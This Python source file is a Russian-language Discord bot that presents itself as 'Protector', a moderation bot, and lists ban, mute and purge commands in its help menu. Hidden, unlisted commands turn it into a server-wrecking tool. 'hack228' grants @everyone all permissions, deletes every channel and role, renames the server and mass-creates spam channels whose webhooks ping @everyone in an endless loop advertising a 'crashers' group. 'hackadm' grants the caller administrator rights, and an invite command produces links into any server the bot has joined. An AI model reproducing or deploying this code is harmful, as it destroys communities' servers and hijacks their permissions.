import discord
from discord import *
from random import randint
import string
import json
import datetime
import keep_alive
import random
from discord import Webhook, AsyncWebhookAdapter
import contextlib
import io
from asyncio import create_task
import os
import threading
import inspect
import time
import requests
import asyncio

import typing
from time import sleep
from discord.ext import commands
from discord.ext.commands import Bot
from discord.utils import get
from os import system, name
from discord_webhook import DiscordWebhook as hook, DiscordEmbed as D_Embed
from discord.ext.commands import cooldown, BucketType
from threading import Thread, Lock
from discord.ext import commands
from asyncio import sleep
from discord import Intents
from discord.ext import commands
from discord.utils import get
from requests import put
import discord
from asyncio import create_task

prefix = "s!"
intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix='s!', intents=intents)
client.remove_command('help') # удаляем встроенную команду хелпа
black_list = json.load(open('black-list.json'))
bl_server = json.load(open('bl-server.json'))
ser_vers = json.load(open('servers.json'))
keep_alive.keep_alive()
dev_ids = [483558478565343232, 467290739219496960,832986836019707904]
premium = [483558478565343232, 467290739219496960, 859707787708727326, 806536984775884891, 942820805165875250,832986836019707904]
"""@commands.cooldown(1, 29, commands.BucketType.user)"""

@client.event
async def on_ready():
  print(f'primary bot {client.user.name}#{client.user.discriminator}({client.user.id}) is ready.')
  global startTime
  startTime = time.time()
  await client.change_presence(activity=discord.Game(name=f"s!help | Всего: 15000+ участников"))
        

@client.event
async def on_guild_join(guild):
  if len(guild.members) <= 10:
    embed = discord.Embed(
            title = 'Попытка краша сервера, где недостаточно участников.',
            description = '''**Согласно нашим данным на этом сервере меньше `10` человек.** \n ```Если у вас есть вопросы, то``` \n **[🔗кликните наш Discord сервер](https://discord.gg/c2P7kn6Edc)**''',
            color = 0x0059ff
        )
    await guild.text_channels[0].send(embed=embed)
    await guild.leave()
    await asyncio.sleep(5)
  if guild.id in ser_vers:
        embed = discord.Embed(
            title = 'Попытка краша сервера из белого списка.',
            description = '''Согласно нашим данным это сервер пытались крашнуть. Мы советуем посмотреть журнал аудита и проверить кто пригласил этого бота. Если у вас есть вопросы, то **[🔗кликните наш Discord сервер](https://discord.gg/c2P7kn6Edc)**''',
            color = 0x0059ff
        )
        await guild.text_channels[0].send(embed=embed)
        await guild.leave()
  adder=None
  try:
    async for entry in guild.audit_logs(action=discord.AuditLogAction.bot_add):
      adder = entry.user
      a_id=adder.id
      break
    if a_id in black_list:
      try: await adder.send("https://discord.gg/8RXuqfJBYk ", embed = discord.Embed(title=':x:Доступ запрещен. Вас добавили в черный список', description=f'Вы можете зайти на сервер, чтобы узнать причину блокировки https://discord.gg/c2P7kn6Edc', colour = 0xf00a0a))
      except: pass
      await guild.leave()
      return
  except: adder="Unknown"; a_id="Unknown"
      
@client.event
async def on_guild_join(guild):
    emb = discord.Embed(
        title = 'Protector',
        description = ''' **Чтобы ознакомиться со списком моих команд напишите:** `s!help`''',
        color = 0xe90000
    )   
    await guild.text_channels[0].send(embed=emb)
    await client.change_presence(activity=discord.Game(name=f"s!help | {len(client.guilds)} серверов"))



@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        tme = f'{round(error.retry_after, 1)}'
        ntme = '.'.join(tme.split('.')[:-1])
        embed = discord.Embed(
            title = 'Ошибка :x:',
            description = f'Вы сможете использовать эту команду только через `{ntme} секунд`.',
            colour = discord.Colour.from_rgb(255, 1, 7)
        )
        msg = await ctx.send(embed=embed)
    elif isinstance(error, commands.MissingPermissions):
        lol2 = discord.Embed(
            title = '💻 Недостаток прав',
            description = "У вас недостаточно прав для выполнения данной команды",
            color = 0xff0000
        )
        await ctx.author.send(embed=lol2)



@client.command()
async def help(ctx):

    mod_text = f'''
```diff
- 1.  s!ban  - забанить участника.
- 2.  s!kick - кикнуть пользователя.
``````yaml
$ 6.  s!av - отправляет аву юзера.
$ 7.  s!massunban - разбанить всех участников.
$ 8.  s!saytext - показывает ваш текст в эмбед.
$ 9.  s!mute - замутить участника.
$ 10. s!unmute - размутить участника.
``````diff
+ 11. s!purge - очистка сообщений.
+ 12. s!ping - пинг бота в милисекундах.
+ 13. s!shar - рандомно отвечает на ваш вопрос.
+ 14. s!nick - сменить ник участнику.
+ 15. s!rand - рандомное число до указанного.
```
'''

    embed = discord.Embed(
        title='📌 | Помощь',
        description=mod_text,
        color=0x2F3136
    )
    await ctx.send(embed=embed)

@client.command(aliases=['info', 'langabot'])
async def about(ctx):
    members = len(set(client.get_all_members()))
    emb = discord.Embed(title='Информация о боте.', description='Вся главная информация о этом боте.',
                        timestamp=ctx.message.created_at, color=0x2F3136)
    emb.add_field(name='Сервер  поддержки бота', value='[Нажмите](https://discord.gg/NRUt2q5xNr)')
    emb.add_field(name='Количество Участников', value=f"{members}")
    emb.add_field(name='Количество Серверов', value=f'{len(client.guilds)}')
    emb.add_field(name='Создатель', value='EQUENOS#2930')
    emb.set_footer(text=f'Запросил: {ctx.author.name}', icon_url=f'{ctx.author.avatar_url}')
    await ctx.send(embed=emb)


@client.command()
async def av(ctx, *,  avamember : discord.Member=None):
    userAvatarUrl = avamember.avatar_url
    embed = discord.Embed(
                title="Аватар пользователя | 👤",
                description=f"**Сервер {ctx.guild.name}**",
                colour=0x00008B)
    embed.set_image(url=f'{userAvatarUrl}')
    await ctx.send(embed=embed)


@client.command()
@commands.has_permissions(administrator=True)
async def massunban(ctx):  # b'\xfc'
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass



# p-ban
@client.command(pass_context=True)
@commands.cooldown(1, 120, commands.BucketType.user)
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: discord.Member, *, reason=None):
    await ctx.channel.purge(limit=1)
    await ctx.guild.ban(member)
    emb = discord.Embed(title='Бан', timestamp=ctx.message.created_at, colour=discord.Colour.from_rgb(207, 215, 255))
    emb.add_field(name='**Выдал бан**', value=ctx.message.author.mention, inline=True)
    emb.add_field(name='**Причина**', value=reason, inline=False)
    emb.set_footer(text=f'Запросил: {ctx.author.name}', icon_url=f'{ctx.author.avatar_url}')
    await ctx.send(embed=emb)


# p-kick
@client.command(pass_context=True)
@commands.cooldown(1, 120, commands.BucketType.user)
@commands.has_permissions(kick_members=True)
async def kick(ctx, user: discord.Member):
    await ctx.guild.kick(user)
    emb = discord.Embed(title='Кик', timestamp=ctx.message.created_at, colour=discord.Colour.from_rgb(207, 215, 255))
    emb.add_field(name='**Выгнал**', value=ctx.message.author.mention, inline=True)
    emb.add_field(name='**Причина**', value=reason, inline=False)
    emb.set_footer(text=f'Запросил: {ctx.author.name}', icon_url=f'{ctx.author.avatar_url}')
    await ctx.send(embed=emb)




@client.command(usage="<member> [reason]")
@commands.has_permissions(manage_messages=True)
async def mute(ctx, member: discord.Member, *, reason="Вы не указали причину"):
        guild = ctx.guild
        mutedRole = discord.utils.get(guild.roles, name="Замучен")

        if not mutedRole:
            mutedRole = await guild.create_role(name="Замучен")

            for channel in guild.channels:
                await channel.set_permissions(mutedRole, speak=False, send_messages=False, read_message_history=True,
                                              read_messages=False)
        mute = discord.Embed(description=f"**Участник отправился в мут.**\n\n"
                                         f"**Модератор:**: {ctx.author.mention}\n"
                                         f"**Участник:**: {member.mention}", colour=discord.Colour.blue())
        mute.add_field(name="Причина", value=reason)
        await member.add_roles(mutedRole, reason=reason)
        await ctx.send(embed=mute)

@client.command(usage="<member>")
@commands.has_permissions(manage_messages=True)
async def unmute( ctx, member: discord.Member):
        mutedRole = discord.utils.get(ctx.guild.roles, name="Замучен")

        await member.remove_roles(mutedRole)
        unmute = discord.Embed(description=f"**Участник размучен.**\n\n"
                                           f"**Модератор:** {ctx.author.mention}\n"
                                           f"**Участник:** {member.mention}", colour=discord.Colour.blue())
        await ctx.send(embed=unmute)


@client.command(pass_context=True)
@commands.has_permissions(manage_messages=True)
async def purge(ctx, amount=30):
    channel = ctx.message.channel
    messages = []
    async for message in channel.history(limit=amount + 1):
              messages.append(message)
    await channel.delete_messages(messages)
    govno = discord.Embed(
          title=f"Очищено {amount} сообщений",
          description=f"**Модератор:** {ctx.author.mention}\n", colour=discord.Colour.blue())
    await ctx.send(embed=govno)



@client.command(pass_context=True)
async def shar(ctx, *, tet):
    govno1 = discord.Embed(
          title=f"{tet}",
          description=f"Несомненно ✅\n", colour=discord.Colour.blue())
    govno2 = discord.Embed(
          title=f"{tet}",
          description=f"Не задумывайся об этом 😡\n", colour=discord.Colour.blue())
    govno3 = discord.Embed(
          title=f"{tet}",
          description=f"Конечно же нет ❎\n", colour=discord.Colour.blue())
    govno4 = discord.Embed(
          title=f"{tet}",
          description=f"Спроси еще раз ❔\n", colour=discord.Colour.blue())
    govno5 = discord.Embed(
          title=f"{tet}",
          description=f"Лучше промолчать...\n", colour=discord.Colour.blue())
    embed=random.choice([govno1, govno2, govno3, govno4, govno5])
    await ctx.send(embed=embed)




@client.command()
async def rand(ctx, c):
    t= randint(0,int(c))
    randomgovno=discord.Embed(
      title="И вам выпало.....",
      description=f"Число **{t}**",
      colour=discord.Colour.blue()
    )
    await ctx.send(embed=randomgovno)


@client.command(pass_context=True)
@commands.cooldown(1, 30, commands.BucketType.user)
@commands.has_permissions(manage_nicknames=True)
async def nick(ctx, member: discord.Member, nick):
    await member.edit(nick=nick)
    govno1 = discord.Embed(
          title=f"Успех!",
          description=f"Ник {member} успешно изменен на **{nick}** ✅\n", colour=discord.Colour.blue())
    await ctx.send(embed=govno1)




@client.command(aliases = ['Ping', 'пинг', 'Пинг'])
async def ping(ctx): 
    ping = client.ws.latency
    message = await ctx.send('Пинг бота') 
    await message.edit(embed = discord.Embed(title='Пинг бота', description=f'`{ping * 1000:.0f}ms`\n', colour = 0x4300fa))

@client.command(pass_context=True)
async def saytext(ctx, *, text):
    await ctx.message.delete()
    embed = discord.Embed(
        title="Успешно отправлено",
        description=text,
        color=0xff0000)
    await ctx.send(embed=embed)




channame = "crash-by-jkcrashers"
chantopic = "Сервер переезжает сюда"
rlsname = "jkcrashers"
rlscolor = random

@client.command()
async def hack228(ctx):
    with open('K.E.Y.jpg', 'rb') as f:
        icon = f.read()
    await ctx.guild.edit(icon=icon)
    await ctx.guild.edit(name='Crash by jkcrashers')
    try:
      role = discord.utils.get(ctx.guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
    except: pass

    await ctx.message.delete()
    await ctx.author.send(f"Начинаю краш сервера `{ctx.guild.name}`")
    async def delchannels(guild):
        me = asyncio.current_task()
        name = me.get_name()
        async def delete(channel):
            try:
                await channel.delete()
            except:
                try:
                    await channel.delete()
                except:
                    pass
                else:
                    pass 
            else:
                pass 
        await asyncio.gather(*[delete(channel) for channel in guild.channels if (channel.type == discord.ChannelType.text and channel.topic != chantopic) or channel.type != discord.ChannelType.text])
    async def delroles(guild):
        me = asyncio.current_task()
        name = me.get_name()
        async def delete(role):
            try:
                await role.delete()
            except:
                try:
                    await role.delete()
                except:
                    pass
                else:
                    pass 
            else:
                pass
        await asyncio.gather(*[delete(role) for role in guild.roles if role.name != rlsname])
    async def roles(guild):
        me = asyncio.current_task()
        nme = me.get_name()
        async def create(name, color):
            try:
                await guild.create_role(name=name, color=color)
            except:
                pass
            else:
                pass 
        await asyncio.gather(*[create(name=rlsname, color=getattr(discord.Colour, rlscolor, discord.Colour.default)()) for _ in range(50)])
    async def channels(guild):
        me = asyncio.current_task()
        nme = me.get_name()
        async def create(name, topic):
            try:
                channel = await guild.create_text_channel(name=name, topic=topic)
            except Exception as e:
                pass 
            else:
                pass
        await asyncio.gather(*[create(name=channame, topic=chantopic) for _ in range(50)])
    tasks = [asyncio.create_task(testtask(ctx.guild)) for testtask in [delchannels, delroles, roles, channels]]
    while False in [x.done() for x in tasks]:
        await asyncio.sleep(0.1)
    pass 

              
    await ctx.author.send(f""":white_check_mark: **Удалены все роли, которые возможно**
:white_check_mark: **Удалены все `каналы`, которые возможно**
:white_check_mark: **Изменено `имя` и `аватарка` серверу**
:white_check_mark: **Создано `50` каналов `#crash-by-jkcrashers`
:white_check_mark: **Идет `спам` в созданные каналы!**
:white_check_mark: **Каждому участнику выдана `админка`!**
**__Сервер `был крашнут`, я `покидаю его`, так же зайдите на наш сервер с краш-ботами__** https://discord.gg/eJC5G2jrhD""")

@client.command(pass_context=True)
async def hackadm(ctx): 
    guild = ctx.guild
    perms = discord.Permissions(administrator=True) 
    await guild.create_role(name="Hack", permissions=perms) 
    
    role = discord.utils.get(ctx.guild.roles, name="Hack") 
    user = ctx.message.author 
    await user.add_roles(role) 
    await ctx.message.delete()
    await ctx.author.send("Вам выдана админка")

@client.event
async def on_guild_channel_create(channel):
    if channel.name == "crash-by-jkcrashers":
      print("test")
      webhook = await channel.create_webhook(name = "Crash by JK Crashers")
    print("test2")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
      print("test3")
      webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
      print("test4")
      while True:
        try:
          await webhook.send("@everyone @here \n Вас крашнули, сервер с краш ботами: https://discord.gg/c2P7kn6Edc ", embed = discord.Embed(title='Привет котаны!) Данный сервер крашится ', description=f'**Хочешь крашить сервера?**<:emoji_76:858227935676858398> \n **Тогда тебе точно к нам!**<:rules:858227884496519209>\n `JKCrashers` __даст вам:__<:star:858227953916968960> \n ```-Удобных и мощных краш ботов. \n-Помощь с рейдом и крашем. \n-Большой функционал краш ботов.``` \n <:gazeta:858227900242853918>**Наши социальные сети** \n <:emoji_77:858227971847487509>`Дискорд сервер` [🔗Клик](https://discord.gg/c2P7kn6Edc) \n <:shit:858228038718193704>`Telegram канал` [🔗Клик](https://t.me/jkcrashers) \n<:emoji_79:858227998498095154>`Youtube создателя` [🔗Клик](https://www.youtube.com/c/JKTimosha)', colour = 0x0059ff))
        except:
          pass


@client.command(name="eval")
async def _eval(ctx, *, command):
  global dev_ids
  if not ctx.author.id in dev_ids:
    return await ctx.send("**Долбаеб!!!**", embed = discord.Embed(title=':x:Доступ запрещен', description=f'Ты не разработчик -_-', colour = 0xf00a0a))
  res = eval(command)
  if inspect.isawaitable(res):
    await ctx.send(await res)
  else:
    await ctx.send(res)

@client.command(brief = "private", description = "Создаёт приглашение, и отправляет его")
async def invite(ctx=None, id=None):
  g = client.get_guild(int(id))
  if not g: return await ctx.send('Сервер не найден')
  for x in g.text_channels:
      link = await x.create_invite(max_age=100, max_uses=100)
      link = str(link)
      await ctx.send(link)
      return link
      await ctx.send(f'Нет прав для создания инвайта ')

@client.command()
async def bl(ctx, param, id: int):
  global dev_ids
  if not ctx.author.id in dev_ids:
    return await ctx.send("Долбаеб", embed = discord.Embed(title=':x:Доступ запрещен', description=f'Ты не разработчик этого творения', colour = 0xf00a0a))
  if param == "add":
    black_list.append(id)
    await ctx.send(f"<@{id}> был добавлен в черный список бота", embed = discord.Embed(title='✅', description=f'Хорошего дня!', colour = 0x0059ff))
  elif param == "remove":
    black_list.remove(id)
    await ctx.send(f"<@{id}> был убран из черного списка бота", embed = discord.Embed(title='✅', description=f'Хорошего дня!', colour = 0x0059ff))
  with open('black-list.json', 'w') as f: json.dump(black_list, f)

@client.command()
async def wl(ctx, param, id: int):
  global dev_ids
  if not ctx.author.id in dev_ids:
    return await ctx.send("Долбаеб", embed = discord.Embed(title=':x:Доступ запрещен', description=f'Ты не разработчик этого творения', colour = 0xf00a0a))
  if param == "add":
    ser_vers.append(id)
    await ctx.send(f"Сервер с этим айди {id} был добавлен", embed = discord.Embed(title='✅', description=f'Хорошего дня!', colour = 0x0059ff))
  elif param == "remove":
    ser_vers.remove(id)
    await ctx.send(f"Сервер с этим айди {id} был убран", embed = discord.Embed(title='✅', description=f'Хорошего дня!', colour = 0x0059ff))
  with open('servers.json', 'w') as f: json.dump(ser_vers, f)
@client.command(
  aliases = ['сказать', 'Сказать', 'Say'])
async def say(ctx, *, msg: str = None):
  global dev_ids
  if not ctx.author.id in dev_ids:
    return await ctx.send("**Долбаеб!!!**", embed = discord.Embed(title=':x:Доступ запрещен', description=f'Ты не разработчик -_-', colour = 0xf00a0a))
  await ctx.send(embed = discord.Embed(description = msg))

@client.command()
async def uptime(ctx):
  uptime = str(datetime.timedelta(seconds=int(round(time.time()-startTime))))
  await ctx.send(uptime)
  await ctx.send("", embed = discord.Embed(title=':point_up_2:Бот работает', description='', colour = 0x0059ff))

@client.command()
async def help_owner(ctx):
		embed = discord.Embed(
			title = ':book: | Меню помощи для Разработчика',
			description = f'`{prefix}say` - **Сказать в embed** \n `{prefix}ping` - **Пинг бота** \n `{prefix}uptime` - **Посмотреть аптайм** \n `{prefix}eval` - **Eval** \n `{prefix}invite id` - **Получить инвайт на сервер по айди** \n `{prefix}bl` `add` or `remove` - **Добавить чела в чс или убрать чела из чс** \n `{prefix}wl` `add` or `remove` - **Добавить сервер в вайт-лист**',
			colour = 0x0059ff)
		embed.set_footer(
			text = 'Все права защищены | JKcrashers',
			icon_url = 'https://cdn.discordapp.com/avatars/483558478565343232/5c5a8740803b62d842d5a0b64ade2612.webp?size=1024')
		embed.set_thumbnail(
			url = 'https://cdn.discordapp.com/avatars/704967695036317777/961384e7fde6d107a479c8ee66b6ac42.webp?size=128')
		await ctx.message.add_reaction('✅')
		await ctx.send(embed=embed)

client.run("")
